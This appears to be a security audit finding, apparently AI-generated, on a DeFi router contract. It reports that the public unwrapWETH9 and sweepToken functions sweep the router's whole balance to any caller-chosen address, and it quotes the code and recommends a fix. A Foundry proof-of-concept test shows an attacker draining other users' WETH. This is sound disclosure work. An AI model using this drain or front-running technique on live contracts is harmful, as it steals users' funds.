The `unwrapWETH9` implementation is confirmed. The analysis is straightforward from the code.

---

### Title
Public `unwrapWETH9` Sweeps Entire Router WETH Balance to Attacker-Chosen Recipient — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

`unwrapWETH9` is a public, permissionless function that reads the router's **total** WETH balance, withdraws all of it, and sends it to a caller-supplied `recipient`. There is no per-caller accounting, no `msg.sender` binding, and no minimum guard when `amountMinimum=0`. Any WETH that reaches the router — from a swap where `recipient: address(router)` was specified — is immediately claimable by any third party.

### Finding Description [1](#0-0) 

```solidity
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));   // total router balance
    if (balanceWETH < amountMinimum) revert InsufficientWETH(...);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);                         // withdraw ALL
        _transferETH(recipient, balanceWETH);                       // send to attacker-chosen address
    }
}
```

The function has three properties that combine into a theft path:

1. **No caller binding** — `recipient` is a free parameter; `msg.sender` is never consulted.
2. **Whole-balance sweep** — `balanceWETH` is `IERC20(WETH).balanceOf(address(this))`, the aggregate of every user's WETH currently held by the router.
3. **Zero-minimum bypass** — passing `amountMinimum=0` disables the only guard, so the call succeeds even when the attacker contributed nothing.

WETH reaches the router legitimately whenever a user calls `exactInputSingle` (or any swap variant) with `tokenOut=WETH` and `recipient=address(router)`, which is the documented pattern for a subsequent `unwrapWETH9` step. [2](#0-1) 

If that unwrap step is issued in a **separate transaction** rather than atomically inside `multicall`, the WETH sits on the router between blocks. An attacker watching the mempool can front-run the victim's `unwrapWETH9` call — or simply poll the router's WETH balance and drain it at any time.

The same structural flaw exists in `sweepToken`: it also sweeps the entire ERC-20 balance to an arbitrary recipient with no caller binding. [3](#0-2) 

### Impact Explanation

Direct, complete loss of the victim's WETH principal. The attacker receives the full ETH equivalent; the victim's subsequent `unwrapWETH9` call either reverts (if `amountMinimum > 0`) or silently sends nothing. No privileged role is required. The attack is deterministic and repeatable for every user who routes WETH output through the router without using `multicall`.

### Likelihood Explanation

- The `multicall`-atomic pattern is the **recommended** usage, but the router exposes `unwrapWETH9` as a standalone `public payable` function with no enforcement that it must be called atomically.
- Any user who calls the swap and the unwrap in two separate transactions — a natural pattern for wallets or integrations that do not support `multicall` — is immediately vulnerable.
- Front-running is trivial on any chain with a public mempool; even without front-running, a passive attacker can monitor the router's WETH balance and drain it between blocks.

### Recommendation

Bind `unwrapWETH9` (and `sweepToken`) to `msg.sender` as the only permitted recipient, or require that they are only callable within a `multicall` context (e.g., via a transient reentrancy flag set by `multicall`). The simplest fix is to remove the free `recipient` parameter and always send to `msg.sender`:

```solidity
function unwrapWETH9(uint256 amountMinimum) public payable {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);   // caller only
    }
}
```

### Proof of Concept

```solidity
// Foundry test sketch
function test_unwrapWETH9_crossUserTheft() public {
    // User A swaps token → WETH, output lands on router (separate tx)
    vm.prank(userA);
    router.exactInputSingle(ExactInputSingleParams({
        ..., tokenOut: address(weth), recipient: address(router), ...
    }));
    uint256 userAWeth = weth.balanceOf(address(router)); // e.g. 1 ether

    // User B does the same in a separate tx
    vm.prank(userB);
    router.exactInputSingle(ExactInputSingleParams({
        ..., tokenOut: address(weth), recipient: address(router), ...
    }));
    uint256 totalWeth = weth.balanceOf(address(router)); // e.g. 2 ether

    // Attacker front-runs both users' unwrap calls
    uint256 attackerBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // amountMinimum=0, recipient=attacker

    // Attacker receives both users' combined WETH as ETH
    assertEq(attacker.balance - attackerBefore, totalWeth);
    assertEq(weth.balanceOf(address(router)), 0);
}
``` [1](#0-0)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L37-45)
```text
  function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);

    if (balanceWETH > 0) {
      IWETH9(WETH).withdraw(balanceWETH);
      _transferETH(recipient, balanceWETH);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L48-55)
```text
  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);

    if (balanceToken > 0) {
      IERC20(token).safeTransfer(recipient, balanceToken);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
